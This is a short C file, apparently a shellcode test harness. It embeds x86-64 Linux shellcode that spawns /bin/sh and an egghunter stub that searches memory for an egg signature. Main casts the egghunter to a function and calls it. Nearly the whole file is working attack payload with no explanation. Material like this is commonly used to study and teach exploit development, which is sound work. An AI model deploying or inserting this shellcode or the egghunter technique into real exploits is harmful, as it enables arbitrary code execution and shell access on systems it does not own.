#include <stdio.h>
#include <string.h>
#include <stdlib.h>

unsigned char second_shellcode[] = \
        "\x48\x31\xc0\x50\x48\xbb\x2f\x62"
        "\x69\x6e\x2f\x73\x68\x53\x48\x89"
        "\xe7\x50\x48\x89\xe2\x57\x48\x89"
        "\xe6\x48\x83\xc0\x3b\x0f\x05";

unsigned char egghunter[] =
        "\x50\x90\x50\x90" // egg signature
        "\x48\x31\xff\x48\x31\xf6\x66\x81"
        "\xcf\xff\x0f\x48\xff\xc7\x6a\x15"
        "\x58\x0f\x05\x3c\xf2\x74\xef\xb8"
        "\x51\x90\x50\x90\xfe\xc8\xaf\x75"
        "\xed\xff\xe7";

int main(void) {

    printf("Egghunter Length:  %ld\n", sizeof(egghunter) - 1);
    printf("Memory location of shellcode: %p\n", second_shellcode);

    int (*ret)() = (int(*)())egghunter;
    ret();
}
